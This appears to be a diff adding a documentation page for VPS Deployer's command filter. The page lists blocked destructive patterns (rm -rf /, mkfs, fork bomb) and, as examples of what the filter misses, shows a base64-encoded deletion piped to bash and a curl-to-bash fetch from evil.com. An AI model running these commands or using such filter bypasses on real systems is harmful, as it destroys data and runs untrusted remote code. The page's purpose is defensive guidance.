@@ -1,0 +1,49 @@
+---
+title: Command Blocking
+description: How dangerous commands are detected and blocked.
+---
+
+## Overview
+
+VPS Deployer includes a basic command filter that blocks known dangerous commands from being executed during deployments.
+
+## Blocked Commands
+
+The following patterns are blocked:
+
+| Pattern | Reason |
+|---|---|
+| `rm -rf /` | Destructive file deletion |
+| `shutdown` | System shutdown |
+| `reboot` | System reboot |
+| `mkfs` | Filesystem formatting |
+| `:(){...}` | Fork bomb |
+
+## How Detection Works
+
+The filter uses **simple string inclusion** — it checks if the command contains any of the blocked patterns. This is a basic safety net, not a comprehensive security sandbox.
+
+## Limitations
+
+:::warning[Important]
+The command filter is **not a security boundary**. It uses substring matching, which means:
+
+- Obfuscated or encoded commands may bypass the filter
+- It cannot detect all dangerous patterns
+- It should not be relied upon as the sole security measure
+:::
+
+### What It Can't Catch
+
+- Commands with variable interpolation: `rm -rf /$VAR`
+- Base64-encoded payloads: `echo "cm0gLXJmIC8=" | base64 -d | bash`
+- Indirect execution: scripts that contain dangerous commands
+- Network-based attacks: `curl http://evil.com/malicious.sh | bash`
+
+## Best Practices
+
+1. **Only trusted users should have access** — the web UI is protected by auth, but anyone with login credentials can create projects and run commands
+2. **Use a strong session key** — prevents session hijacking
+3. **Run as a non-root user** — limits the damage any command can do
+4. **Use sudoers for specific commands** — see [Privileged Commands](/production/reverse-proxy/) for granular control
+5. **Monitor logs** — review `vps-deployer.log` regularly for suspicious activity
